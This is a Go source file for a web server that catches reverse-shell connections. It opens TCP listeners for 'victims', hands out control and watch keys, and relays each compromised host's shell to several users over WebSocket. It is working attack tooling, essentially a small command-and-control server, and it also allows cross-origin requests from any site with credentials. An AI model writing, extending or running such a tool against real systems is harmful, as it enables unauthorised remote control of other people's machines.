package main

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"math/rand"
	"net"
	"net/http"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  2048,
	WriteBufferSize: 2048,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

var app *App

func getRandID() string {
	randChars := "abcdefghijklmnopqrstuvwxyz1234567890"
	id := ""
	for i := 0; i < 8; i++ {
		id += string(randChars[rand.Intn(len(randChars))])
	}
	return id
}
func Cors(c *gin.Context) {
	method := c.Request.Method
	origin := c.Request.Header.Get("Origin")
	if origin != "" {
		c.Header("Access-Control-Allow-Origin", "*") // 可将将 * 替换为指定的域名
		c.Header("Access-Control-Allow-Methods", "POST, GET, OPTIONS, PUT, DELETE, UPDATE")
		c.Header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization")
		c.Header("Access-Control-Expose-Headers", "Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type")
		c.Header("Access-Control-Allow-Credentials", "true")
	}
	if method == "OPTIONS" {
		c.AbortWithStatus(http.StatusNoContent)
	}
	c.Next()
} //跨域
func createNewListener(c *gin.Context) {
	newVictim := &Victim{
		ControlKey: getRandID(),
		WatchKey:   getRandID(),
		History:    "",
	}
	cha := make(chan bool, 0)
	newVictim.IsTCPConnectedChan = make(chan bool, 0)
	go func(v *Victim) {
		tcpListener, err := app.createNewTCPConnection()
		if err != nil {
			fmt.Println(err)
			return
		}
		v.ListenPort = tcpListener.Addr().(*net.TCPAddr).Port
		cha <- true
		v.TCPConnection, err = tcpListener.Accept()
		v.RemoteHost = v.TCPConnection.RemoteAddr().String()
		v.IsTCPConnectedChan <- true
	}(newVictim)
	app.Victims = append(app.Victims, newVictim)
	if <-cha {
		c.JSON(200, gin.H{"Key": newVictim.ControlKey, "IP": app.HostIP, "Port": newVictim.ListenPort})
	}
}
func createNewWSConnection(c *gin.Context) {
	key := c.Query("key")
	name := c.Query("name")
	newUser := &User{
		Name: name,
		IP:   c.ClientIP(),
	}
	for _, victim := range app.Victims {
		var err error
		//分三种情况，一是还没连过Owner为空则首位为Owner，然后就是分别添加到Controller和Watcher
		if victim.ControlKey == key {
			if victim.Owner == nil {
				newUser.Control = true

				newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
				if err != nil {
					fmt.Println(err)
					c.JSON(500, gin.H{"error": "websocket建立失败"})
					return
				}
				newUser.WSConn.SetCloseHandler(func(code int, text string) error {
					newUser.WSConn.Close()
					if victim.TCPConnection != nil {
						victim.Close()
					}
					return nil
				})
				newUser.Attack = victim
				victim.Owner = newUser
				go victim.TCPListenHandler()
				break
			} else {
				newUser.Control = true
				newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
				if err != nil {
					fmt.Println(err)
					c.JSON(500, gin.H{"error": "websocket建立失败"})
					return
				}
				newUser.WSConn.SetCloseHandler(func(code int, text string) error {
					newUser.Leave(victim)
					return nil
				})
				newUser.Attack = victim
				victim.Users = append(victim.Users, newUser)
				break
			}
		} else if victim.WatchKey == key {
			newUser.Control = false

			newUser.WSConn, err = upgrader.Upgrade(c.Writer, c.Request, nil)
			if err != nil {
				fmt.Println(err)
				c.JSON(500, gin.H{"error": "websocket建立失败"})
				return
			}
			newUser.WSConn.SetCloseHandler(func(code int, text string) error {
				newUser.Leave(victim)
				return nil
			})
			newUser.Attack = victim
			victim.Users = append(victim.Users, newUser)
			break
		}
	}
	if newUser.WSConn == nil {
		c.JSON(404, gin.H{"error": "您输入的key无效，请重新输入"})
		return
	}
	newUser.Attack.SendNoticeMessage(fmt.Sprintf("用户%s已加入shell", newUser.Name))
	if newUser.Attack.TCPConnection == nil {
		newUser.Attack.SendNoticeMessage(fmt.Sprintf("反弹shell地址为：%s:%d", app.HostIP, newUser.Attack.ListenPort))
	}
	go newUser.WebSockerHandler()
}
func main() {
	app = &App{LowPort: 20000, HighPort: 50000, HostIP: "127.0.0.1", Ports: make([]bool, 65535)}
	httpServer := gin.Default()
	httpServer.Use(Cors)
	httpServer.GET("/createNewListener", createNewListener)
	httpServer.GET("/ws", createNewWSConnection)
	httpServer.Run(":8080")
}
